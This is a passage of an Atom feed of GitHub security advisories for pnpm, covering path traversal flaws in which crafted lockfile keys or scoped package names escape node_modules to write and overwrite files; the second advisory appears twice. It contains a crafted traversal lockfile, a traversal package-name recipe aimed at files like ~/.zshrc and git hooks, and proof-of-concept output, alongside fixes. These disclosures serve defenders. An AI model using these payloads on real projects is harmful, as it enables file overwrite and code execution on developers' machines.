<li><code>~/.local/bin/</code> — binary hijacking</li>
<li>Project source files — supply chain injection</li>
</ul>
<h2 id="reproduction">Reproduction</h2>
<p>Craft a <code>pnpm-lock.yaml</code>:</p>
<pre><code class="language-yaml">lockfileVersion: '9.0'
packages:
  ../../../../../../../tmp/pwned@1.0.0:
    resolution: {integrity: sha512-&lt;real-package-integrity&gt;}
    engines: {node: '&gt;=14'}
snapshots:
  ../../../../../../../tmp/pwned@1.0.0: {}
importers:
  .:
    dependencies:
      legitimate-name:
        specifier: ^1.0.0
        version: ../../../../../../../tmp/pwned@1.0.0
</code></pre>
<p>Run <code>pnpm install</code> — package content is written to <code>/tmp/pwned/</code> instead of the virtual store.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Apply <code>safeJoinModulesDir</code> (or equivalent validation) at:</p>
<ul>
<li><code>lockfileToDepGraph.ts:233</code> — <code>path.join(modules, pkgName)</code></li>
<li><code>after-install/src/index.ts:402</code> — <code>path.join(pkgModulesDir(depPath), pkgInfo.name)</code></li>
<li><code>lockfile/to-pnp/src/index.ts:105-110</code> — PnP <code>packageLocation</code></li>
</ul>
<p>Alternatively, validate depPath keys during lockfile parsing to reject any that don't produce valid npm package names via <code>dp.parse()</code>.</p>
<h2 id="relationship-to-ghsa-fr4h-3cph-29xv">Relationship to GHSA-fr4h-3cph-29xv</h2>
<p>GHSA-fr4h-3cph-29xv fixed the hoisted linker path (<code>lockfileToHoistedDepGraph.ts:222</code>) by adding <code>safeJoinModulesDir</code>. The same fix was NOT applied to the virtual store linker, which uses the identical <code>dp.parse().name → path.join()</code> pattern at <code>lockfileToDepGraph.ts:233</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-c59q-g84q-2gj5">https://github.com/pnpm/pnpm/security/advisories/GHSA-c59q-g84q-2gj5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-82392">https://nvd.nist.gov/vuln/detail/CVE-2026-82392</a></li>
<li><a href="https://github.com/pnpm/pnpm/pull/12872">https://github.com/pnpm/pnpm/pull/12872</a></li>
<li><a href="https://github.com/pnpm/pnpm/pull/12890">https://github.com/pnpm/pnpm/pull/12890</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7">https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/78e29fe5583a1e5d69ea05e414eff310f78d5ed9">https://github.com/pnpm/pnpm/commit/78e29fe5583a1e5d69ea05e414eff310f78d5ed9</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v10.34.5">https://github.com/pnpm/pnpm/releases/tag/v10.34.5</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v11.11.0">https://github.com/pnpm/pnpm/releases/tag/v11.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-c59q-g84q-2gj5">https://github.com/advisories/GHSA-c59q-g84q-2gj5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c59q-g84q-2gj5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-02T14:37:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: A tarball dependency's manifest `name` escapes node_modules → arbitrary file write/overwrite on install]]></title>
        <id>https://github.com/advisories/GHSA-vq4v-j7r6-jq4m</id>
        <link href="https://github.com/advisories/GHSA-vq4v-j7r6-jq4m"/>
        <updated>2026-09-02T14:37:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When resolving a package, pnpm uses the resolved <strong>manifest <code>name</code></strong> as a raw path segment for the isolated-linker import target. A tarball dependency whose <code>package.json</code> <code>name</code> is a scoped path traversal (<code>@x/../../…/&lt;abs path&gt;</code>) is therefore extracted <strong>outside <code>node_modules</code></strong>, to an attacker-chosen absolute path, and can <strong>overwrite existing files</strong> there. Attacker controls the destination, filenames, and contents → arbitrary file write → <strong>code execution</strong> (e.g. <code>~/.zshrc</code>, <code>.git/hooks/pre-commit</code>, another package's code). Occurs during <code>pnpm install</code> <strong>even with <code>--ignore-scripts</code></strong> (no lifecycle scripts run), defeating that safety.</p>
<p>Same class as the just-patched <strong>GHSA-hwx4</strong> (transitive-dependency <em>alias</em> traversal) and <strong>GHSA-v23m</strong> (<code>stage download</code> manifest name/version traversal), in a sink their fixes did not cover: the isolated-linker import target keyed by the resolved <strong>name</strong>.</p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li>The isolated-linker import target is built with a raw <code>path.join(modules, &lt;resolved name&gt;)</code> in <code>installing/deps-resolver/src/resolvePeers.ts:706</code>, <code>installing/deps-resolver/src/index.ts:614</code>, and <code>deps/graph-builder/src/lockfileToDepGraph.ts:233</code> — <strong>without</strong> the <code>safeJoinModulesDir</code> guard used on the symlink/hoisted/bin paths (<code>installing/deps-restorer/src/lockfileToHoistedDepGraph.ts:222</code>). The store location is <code>node_modules/.pnpm/&lt;id&gt;/node_modules/&lt;name&gt;</code>, so a traversal <code>&lt;name&gt;</code> escapes.</li>
<li>The only resolve-time name gate (<code>resolving/npm-resolver/src/pickPackage.ts:753</code>) rejects only <em>unscoped</em> names containing <code>/</code>, so a <strong>scoped</strong> <code>@x/../..</code> passes.</li>
</ul>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<p>Self-contained PoC (real <code>pnpm@11.9.0</code>; loopback tarball server; escape target is a throwaway temp dir):</p>
<pre><code>npm i pnpm@11.9.0
# host a tarball whose package.json name = "@x/"+"../".repeat(25)+"&lt;abs&gt;/OUTSIDE"; victim depends on the http URL
pnpm install --ignore-scripts
</code></pre>
<p>Confirmed output (<code>repro/poc.mjs</code>, exit 0):</p>
<pre><code>escape dir is outside the project        : true
new file implanted outside node_modules  : true
pre-existing file OVERWRITTEN            : true
*** CONFIRMED: a tarball dependency wrote &amp; overwrote files OUTSIDE the project during `pnpm install --ignore-scripts` ***
</code></pre>
<h2 id="remediation">Remediation</h2>
<p>Route the isolated-linker import-target joins (<code>resolvePeers.ts:706</code>, <code>deps-resolver/index.ts:614</code>, <code>lockfileToDepGraph.ts:233</code>) through <code>safeJoinModulesDir</code> (as the hoisted linker already does), and/or enforce <code>validate-npm-package-name</code> on the resolved manifest name (close the scoped-name gap at <code>pickPackage.ts:753</code>) so the import target rejects a traversal name and re-asserts containment before any write.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-vq4v-j7r6-jq4m">https://github.com/pnpm/pnpm/security/advisories/GHSA-vq4v-j7r6-jq4m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-82393">https://nvd.nist.gov/vuln/detail/CVE-2026-82393</a></li>
<li><a href="https://github.com/pnpm/pnpm/pull/12872">https://github.com/pnpm/pnpm/pull/12872</a></li>
<li><a href="https://github.com/pnpm/pnpm/pull/12890">https://github.com/pnpm/pnpm/pull/12890</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7">https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/78e29fe5583a1e5d69ea05e414eff310f78d5ed9">https://github.com/pnpm/pnpm/commit/78e29fe5583a1e5d69ea05e414eff310f78d5ed9</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v10.34.5">https://github.com/pnpm/pnpm/releases/tag/v10.34.5</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v11.11.0">https://github.com/pnpm/pnpm/releases/tag/v11.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-vq4v-j7r6-jq4m">https://github.com/advisories/GHSA-vq4v-j7r6-jq4m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vq4v-j7r6-jq4m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-02T14:36:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: A tarball dependency's manifest `name` escapes node_modules → arbitrary file write/overwrite on install]]></title>
        <id>https://github.com/advisories/GHSA-vq4v-j7r6-jq4m</id>
        <link href="https://github.com/advisories/GHSA-vq4v-j7r6-jq4m"/>
        <updated>2026-09-02T14:37:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When resolving a package, pnpm uses the resolved <strong>manifest <code>name</code></strong> as a raw path segment for the isolated-linker import target. A tarball dependency whose <code>package.json</code> <code>name</code> is a scoped path traversal (<code>@x/../../…/&lt;abs path&gt;</code>) is therefore extracted <strong>outside <code>node_modules</code></strong>, to an attacker-chosen absolute path, and can <strong>overwrite existing files</strong> there. Attacker controls the destination, filenames, and contents → arbitrary file write → <strong>code execution</strong> (e.g. <code>~/.zshrc</code>, <code>.git/hooks/pre-commit</code>, another package's code). Occurs during <code>pnpm install</code> <strong>even with <code>--ignore-scripts</code></strong> (no lifecycle scripts run), defeating that safety.</p>
<p>Same class as the just-patched <strong>GHSA-hwx4</strong> (transitive-dependency <em>alias</em> traversal) and <strong>GHSA-v23m</strong> (<code>stage download</code> manifest name/version traversal), in a sink their fixes did not cover: the isolated-linker import target keyed by the resolved <strong>name</strong>.</p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li>The isolated-linker import target is built with a raw <code>path.join(modules, &lt;resolved name&gt;)</code> in <code>installing/deps-resolver/src/resolvePeers.ts:706</code>, <code>installing/deps-resolver/src/index.ts:614</code>, and <code>deps/graph-builder/src/lockfileToDepGraph.ts:233</code> — <strong>without</strong> the <code>safeJoinModulesDir</code> guard used on the symlink/hoisted/bin paths (<code>installing/deps-restorer/src/lockfileToHoistedDepGraph.ts:222</code>). The store location is <code>node_modules/.pnpm/&lt;id&gt;/node_modules/&lt;name&gt;</code>, so a traversal <code>&lt;name&gt;</code> escapes.</li>
<li>The only resolve-time name gate (<code>resolving/npm-resolver/src/pickPackage.ts:753</code>) rejects only <em>unscoped</em> names containing <code>/</code>, so a <strong>scoped</strong> <code>@x/../..</code> passes.</li>
</ul>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<p>Self-contained PoC (real <code>pnpm@11.9.0</code>; loopback tarball server; escape target is a throwaway temp dir):</p>
<pre><code>npm i pnpm@11.9.0
# host a tarball whose package.json name = "@x/"+"../".repeat(25)+"&lt;abs&gt;/OUTSIDE"; victim depends on the http URL
pnpm install --ignore-scripts
</code></pre>
<p>Confirmed output (<code>repro/poc.mjs</code>, exit 0):</p>
<pre><code>escape dir is outside the project        : true
new file implanted outside node_modules  : true
pre-existing file OVERWRITTEN            : true
*** CONFIRMED: a tarball dependency wrote &amp; overwrote files OUTSIDE the project during `pnpm install --ignore-scripts` ***
</code></pre>
<h2 id="remediation">Remediation</h2>
<p>Route the isolated-linker import-target joins (<code>resolvePeers.ts:706</code>, <code>deps-resolver/index.ts:614</code>, <code>lockfileToDepGraph.ts:233</code>) through <code>safeJoinModulesDir</code> (as the hoisted linker already does), and/or enforce <code>validate-npm-package-name</code> on the resolved manifest name (close the scoped-name gap at <code>pickPackage.ts:753</code>) so the import target rejects a traversal name and re-asserts containment before any write.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-vq4v-j7r6-jq4m">https://github.com/pnpm/pnpm/security/advisories/GHSA-vq4v-j7r6-jq4m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-82393">https://nvd.nist.gov/vuln/detail/CVE-2026-82393</a></li>
<li><a href="https://github.com/pnpm/pnpm/pull/12872">https://github.com/pnpm/pnpm/pull/12872</a></li>
<li><a href="https://github.com/pnpm/pnpm/pull/12890">https://github.com/pnpm/pnpm/pull/12890</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7">https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/78e29fe5583a1e5d69ea05e414eff310f78d5ed9">https://github.com/pnpm/pnpm/commit/78e29fe5583a1e5d69ea05e414eff310f78d5ed9</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v10.34.5">https://github.com/pnpm/pnpm/releases/tag/v10.34.5</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v11.11.0">https://github.com/pnpm/pnpm/releases/tag/v11.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-vq4v-j7r6-jq4m">https://github.com/advisories/GHSA-vq4v-j7r6-jq4m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vq4v-j7r6-jq4m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-02T14:36:59.000Z</published>
    </entry>
</feed>